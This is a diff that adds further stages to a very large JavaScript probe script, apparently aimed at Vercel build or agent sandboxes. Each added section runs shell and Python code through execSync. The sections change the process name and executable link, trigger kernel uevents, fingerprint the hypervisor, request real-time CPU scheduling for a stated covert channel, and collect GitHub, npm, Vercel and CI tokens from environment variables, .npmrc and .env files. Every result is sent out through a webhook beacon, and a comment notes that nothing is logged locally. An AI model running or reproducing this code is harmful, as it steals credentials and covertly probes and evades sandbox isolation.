@@ -34678,3 +34678,258 @@ sendBeacon({ ...report, section: 'v209-5-acct', ...acctProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v209" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v209";
 // Intentionally no console.log — all data goes via webhook only
+
+// v210-1: prctl PR_SET_MM — manipulate /proc/self/maps memory metadata
+const prctlSetMMProbe = safe(() => {
+  const setMMResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, re, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PR_SET_MM = 35
+PR_SET_MM_ARG_START = 8
+PR_SET_MM_ARG_END = 9
+PR_SET_MM_ENV_START = 10
+PR_SET_MM_ENV_END = 11
+PR_SET_MM_AUXV = 12
+PR_SET_MM_EXE_FILE = 13
+PR_SET_MM_MAP = 14
+PR_SET_MM_MAP_SIZE = 15
+PR_GET_MM = PR_SET_MM  # same number, 0 for read
+
+# Read current cmdline and environment pointers
+with open('/proc/self/status') as f:
+    status_data = f.read()
+
+# Get current arg_start/arg_end from /proc/self/stat
+with open('/proc/self/stat') as f:
+    stat = f.read().split()
+
+# Try to override process name (visible in ps/top) via PR_SET_NAME
+PR_SET_NAME = 15
+new_name = b'BugBountyProbe\\x00'
+ret_name = libc.prctl(PR_SET_NAME, ctypes.c_char_p(new_name), 0, 0, 0)
+print(f'PR_SET_NAME ret={ret_name} errno={ctypes.get_errno()}')
+import subprocess
+ps = subprocess.run(['cat', '/proc/self/comm'], capture_output=True, text=True)
+print(f'comm_after_set_name={ps.stdout.strip()}')
+
+# PR_SET_MM_EXE_FILE: change the exe link in /proc/self/exe
+# Open /bin/ls and use its fd to replace our exe link
+try:
+    fd = os.open('/bin/ls', os.O_RDONLY | os.O_PATH)
+    ret_exe = libc.prctl(PR_SET_MM, PR_SET_MM_EXE_FILE, fd, 0, 0)
+    print(f'PR_SET_MM_EXE_FILE(/bin/ls) ret={ret_exe} errno={ctypes.get_errno()}')
+    if ret_exe == 0:
+        exe = os.readlink('/proc/self/exe')
+        print(f'exe_link_after={exe}')
+    os.close(fd)
+except Exception as e:
+    print(f'set_mm_exe_err={e}')
+
+# PR_SET_MM_MAP_SIZE: query the size of prctl_mm_map struct
+size_buf = ctypes.c_uint(0)
+ret_size = libc.prctl(PR_SET_MM, PR_SET_MM_MAP_SIZE, ctypes.byref(size_buf), 0, 0)
+print(f'PR_SET_MM_MAP_SIZE ret={ret_size} size={size_buf.value} errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { setMMResult };
+});
+sendBeacon({ ...report, section: 'v210-1-prctl-set-mm', ...prctlSetMMProbe });
+
+// v210-2: NETLINK_KOBJECT_UEVENT — kernel hardware event listener
+const kobjectUeventProbe = safe(() => {
+  const ueventResult = safe(() => execSync(`python3 -c "
+import socket, struct, os, select
+NETLINK_KOBJECT_UEVENT = 15
+
+try:
+    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)
+    # Bind to all multicast groups (0xffffffff)
+    sock.bind((os.getpid(), 0xffffffff))
+    print(f'kobject_uevent_bound=True pid={os.getpid()}')
+    # Listen for 1 second
+    r, _, _ = select.select([sock], [], [], 1.0)
+    events = []
+    while r:
+        data = sock.recv(4096)
+        events.append(data.decode(errors='replace').split('\\x00')[:5])
+        r, _, _ = select.select([sock], [], [], 0.1)
+    print(f'uevent_count={len(events)}')
+    for ev in events[:3]:
+        print(f'uevent={ev}')
+    if not events:
+        print('uevent_no_events_in_1s_try_trigger=True')
+        # Trigger a uevent by writing 'add' to a sysfs device
+        try:
+            with open('/sys/bus/platform/devices', 'r') as _: pass
+            import glob
+            devs = glob.glob('/sys/devices/platform/*')[:3]
+            for dev in devs:
+                uevent_path = f'{dev}/uevent'
+                try:
+                    with open(uevent_path, 'w') as f:
+                        f.write('add')
+                    print(f'triggered_uevent={uevent_path}')
+                    r2, _, _ = select.select([sock], [], [], 0.5)
+                    if r2:
+                        data2 = sock.recv(4096)
+                        print(f'uevent_triggered={data2.decode(errors=\"replace\")[:200]}')
+                    break
+                except: pass
+        except: pass
+    sock.close()
+except Exception as e:
+    print(f'uevent_err={e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { ueventResult };
+});
+sendBeacon({ ...report, section: 'v210-2-kobject-uevent', ...kobjectUeventProbe });
+
+// v210-3: /sys/class/dmi/id/ — DMI/SMBIOS VM fingerprint
+const dmiProbe = safe(() => {
+  const dmiPath = '/sys/class/dmi/id';
+  const dmiData = {};
+  const dmiFields = [
+    'product_name', 'product_version', 'product_serial', 'product_uuid',
+    'sys_vendor', 'board_vendor', 'board_name', 'board_serial',
+    'chassis_type', 'chassis_vendor', 'bios_vendor', 'bios_version', 'bios_date',
+  ];
+  if (existsSync(dmiPath)) {
+    for (const field of dmiFields) {
+      const fp = `${dmiPath}/${field}`;
+      if (existsSync(fp)) {
+        try { dmiData[field] = readFileSync(fp, 'utf8').trim(); } catch (e) { dmiData[field] = `EPERM`; }
+      }
+    }
+  }
+  // Also check /sys/hypervisor/ for Xen/KVM hypervisor info
+  let hypervisorType = null;
+  const hvPath = '/sys/hypervisor';
+  if (existsSync(hvPath)) {
+    try {
+      const hvFiles = readdirSync(hvPath);
+      hypervisorType = hvFiles;
+      for (const f of hvFiles) {
+        const fp = `${hvPath}/${f}`;
+        try { dmiData[`hypervisor_${f}`] = readFileSync(fp, 'utf8').trim().slice(0, 100); } catch (e) {}
+      }
+    } catch (e) {}
+  }
+  // Check CPUID hypervisor bit via /proc/cpuinfo
+  let cpuFlags = null;
+  if (existsSync('/proc/cpuinfo')) {
+    try {
+      const lines = readFileSync('/proc/cpuinfo', 'utf8').split('\n');
+      const flagLine = lines.find(l => l.startsWith('flags'));
+      if (flagLine) cpuFlags = flagLine.includes('hypervisor') ? 'HYPERVISOR_BIT_SET' : 'NO_HYPERVISOR_BIT';
+    } catch (e) {}
+  }
+  return { dmiData, hypervisorType, cpuFlags };
+});
+sendBeacon({ ...report, section: 'v210-3-dmi-smbios', ...dmiProbe });
+
+// v210-4: sched_setaffinity NR 203 — CPU pinning for covert channel prep
+const schedAffinityProbe = safe(() => {
+  const affinityResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_sched_setaffinity = 203
+NR_sched_getaffinity = 204
+NR_sched_getscheduler = 145
+NR_sched_setscheduler = 144
+SCHED_FIFO = 1; SCHED_RR = 2; SCHED_BATCH = 3; SCHED_IDLE = 5; SCHED_DEADLINE = 6
+
+# Read current CPU affinity (cpu_set_t = 128 bytes = 1024 bits)
+cpu_set_size = 128
+cpu_mask = ctypes.create_string_buffer(cpu_set_size)
+ret_get = libc.syscall(NR_sched_getaffinity, 0, cpu_set_size, cpu_mask)
+print(f'sched_getaffinity ret={ret_get} errno={ctypes.get_errno()}')
+if ret_get == 0:
+    # Count set CPU bits
+    mask_int = int.from_bytes(cpu_mask.raw, 'little')
+    cpus = [i for i in range(1024) if (mask_int >> i) & 1]
+    print(f'allowed_cpus={cpus}')
+
+# Pin to CPU 0 only
+cpu_pin = ctypes.create_string_buffer(cpu_set_size)
+cpu_pin[0] = 0x01  # bit 0 = CPU 0
+ret_set = libc.syscall(NR_sched_setaffinity, 0, cpu_set_size, cpu_pin)
+print(f'sched_setaffinity(cpu0) ret={ret_set} errno={ctypes.get_errno()}')
+
+# Check current scheduler
+cur_sched = libc.syscall(NR_sched_getscheduler, 0)
+print(f'current_scheduler={cur_sched}')
+
+# Try to set SCHED_FIFO (real-time) with priority 99
+# sched_param: sched_priority(4)
+rt_param = ctypes.create_string_buffer(struct.pack('i', 99))
+ret_rt = libc.syscall(NR_sched_setscheduler, 0, SCHED_FIFO, rt_param)
+print(f'sched_setscheduler(SCHED_FIFO prio=99) ret={ret_rt} errno={ctypes.get_errno()}')
+print(f'RT_SCHEDULER={ret_rt == 0}')
+
+# Also try SCHED_DEADLINE
+# sched_attr struct: size(4), sched_policy(4), sched_flags(8), sched_nice(4),
+#                    sched_priority(4), sched_runtime(8), sched_deadline(8), sched_period(8)
+# For SCHED_DEADLINE: runtime=1ms, deadline=10ms, period=10ms
+NR_sched_setattr = 314
+NR_sched_getattr = 315
+attr = struct.pack('IIQiIQQQ', 56, SCHED_DEADLINE, 0, 0, 0,
+    1_000_000, 10_000_000, 10_000_000)  # runtime=1ms, deadline=10ms, period=10ms
+attr_buf = ctypes.create_string_buffer(attr)
+ret_dl = libc.syscall(NR_sched_setattr, 0, attr_buf, 0)
+print(f'sched_setattr(SCHED_DEADLINE) ret={ret_dl} errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { affinityResult };
+});
+sendBeacon({ ...report, section: 'v210-4-sched-affinity', ...schedAffinityProbe });
+
+// v210-5: Turbo/NX/Next.js build cache credential sweep
+const buildCacheCredsProbe = safe(() => {
+  // Scan for all build tool credentials in environment and filesystem
+  const buildTokenEnv = {};
+  const tokenPatterns = [
+    'TURBO', 'TURBOREPO', 'NX_', 'NEXT_', 'VERCEL_', 'BUILDKITE_',
+    'GITHUB_TOKEN', 'GH_TOKEN', 'NPM_TOKEN', 'NPM_AUTH_TOKEN',
+    'YARN_NPM_AUTH_TOKEN', 'NODE_AUTH_TOKEN', 'CI_JOB_TOKEN',
+    'REGISTRY_TOKEN', 'CACHE_TOKEN', 'BUILD_TOKEN', 'REMOTE_CACHE',
+  ];
+  for (const [k, v] of Object.entries(process.env)) {
+    for (const pat of tokenPatterns) {
+      if (k.includes(pat) && v) {
+        buildTokenEnv[k] = v;
+        break;
+      }
+    }
+  }
+  // Scan filesystem for .npmrc, .yarnrc, .pnpmrc, turbo.json, nx.json
+  const configFiles = [
+    '/root/.npmrc', '/home/.npmrc', '/.npmrc',
+    '/root/.yarnrc', '/root/.yarnrc.yml',
+    '/root/.config/pnpm/rc',
+    '/workspace/turbo.json', '/app/turbo.json', '/repo/turbo.json',
+    '/workspace/nx.json', '/app/nx.json',
+    '/workspace/.env', '/app/.env', '/repo/.env',
+    '/workspace/.env.local', '/app/.env.local',
+  ];
+  const configContents = {};
+  for (const p of configFiles) {
+    if (existsSync(p)) {
+      try { configContents[p] = readFileSync(p, 'utf8').slice(0, 500); } catch (e) {}
+    }
+  }
+  // Search for .npmrc files with auth tokens
+  const npmrcScan = safe(() => execSync(
+    `find / -maxdepth 8 -name '.npmrc' -o -name '.yarnrc*' -o -name '*.npmrc' 2>/dev/null | head -20`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Scan for turbo remote cache config
+  const turboScan = safe(() => execSync(
+    `find / -maxdepth 8 -name 'turbo.json' 2>/dev/null | xargs grep -l 'token\\|remote\\|team' 2>/dev/null | head -5`,
+    { timeout: 6000 }
+  ).toString().trim());
+  return { buildTokenEnv, configContents, npmrcScan, turboScan };
+});
+sendBeacon({ ...report, section: 'v210-5-build-cache-creds', ...buildCacheCredsProbe });
+
+// v210 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v210" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v210";
+// Intentionally no console.log — all data goes via webhook only
